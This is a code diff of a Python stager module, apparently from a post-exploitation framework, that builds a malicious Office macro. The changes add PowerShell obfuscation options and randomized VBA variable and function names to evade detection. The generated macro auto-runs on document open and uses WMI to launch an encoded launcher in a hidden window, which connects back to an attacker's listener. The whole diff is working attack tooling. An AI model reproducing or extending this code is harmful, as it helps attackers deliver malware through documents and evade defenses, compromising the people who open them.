@@ -1,4 +1,5 @@
 from lib.common import helpers
+import random, string
 
 class Stager:
 
@@ -40,6 +41,16 @@ class Stager:
                 'Required'      :   False,
                 'Value'         :   '/tmp/macro'
             },
+            'Obfuscate' : {
+                'Description'   :   'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
+                'Required'      :   False,
+                'Value'         :   'False'
+            },
+            'ObfuscateCommand' : {
+                'Description'   :   'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
+                'Required'      :   False,
+                'Value'         :   r'Token\All\1,Launcher\STDIN++\12467'
+            },
             'UserAgent' : {
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                 'Required'      :   False,
@@ -74,35 +85,43 @@ class Stager:
         language = self.options['Language']['Value']
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
+        obfuscate = self.options['Obfuscate']['Value']
+        obfuscateCommand = self.options['ObfuscateCommand']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
         stagerRetries = self.options['StagerRetries']['Value']
 
+        obfuscateScript = False
+        if obfuscate.lower() == "true":
+            obfuscateScript = True
+
         # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
+        Str = ''.join(random.choice(string.letters) for i in range(random.randint(1,len(listenerName))))
+        Method=''.join(random.choice(string.letters) for i in range(random.randint(1,len(listenerName))))
 
         if launcher == "":
             print helpers.color("[!] Error in launcher command generation.")
             return ""
         else:
             chunks = list(helpers.chunks(launcher, 50))
-            payload = "\tDim Str As String\n"
-            payload += "\tstr = \"" + str(chunks[0]) + "\"\n"
+            payload = "\tDim "+Str+" As String\n"
+            payload += "\t"+Str+" = \"" + str(chunks[0]) + "\"\n"
             for chunk in chunks[1:]:
-                payload += "\tstr = str + \"" + str(chunk) + "\"\n"
+                payload += "\t"+Str+" = "+Str+" + \"" + str(chunk) + "\"\n"
 
             macro = "Sub Auto_Open()\n"
-            macro += "\tDebugging\n"
+            macro += "\t"+Method+"\n"
             macro += "End Sub\n\n"
-            macro = "Sub AutoOpen()\n"
-            macro += "\tDebugging\n"
+            macro += "Sub AutoOpen()\n"
+            macro += "\t"+Method+"\n"
             macro += "End Sub\n\n"
 
             macro += "Sub Document_Open()\n"
-            macro += "\tDebugging\n"
+            macro += "\t"+Method+"\n"
             macro += "End Sub\n\n"
 
-            macro += "Public Function Debugging() As Variant\n"
+            macro += "Public Function "+Method+"() As Variant\n"
             macro += payload
             macro += "\tConst HIDDEN_WINDOW = 0\n"
             macro += "\tstrComputer = \".\"\n"
@@ -111,7 +130,7 @@ class Stager:
             macro += "\tSet objConfig = objStartup.SpawnInstance_\n"
             macro += "\tobjConfig.ShowWindow = HIDDEN_WINDOW\n"
             macro += "\tSet objProcess = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\cimv2:Win32_Process\")\n"
-            macro += "\tobjProcess.Create str, Null, objConfig, intProcessID\n"
+            macro += "\tobjProcess.Create "+Str+", Null, objConfig, intProcessID\n"
             macro += "End Function\n"
 
             return macro
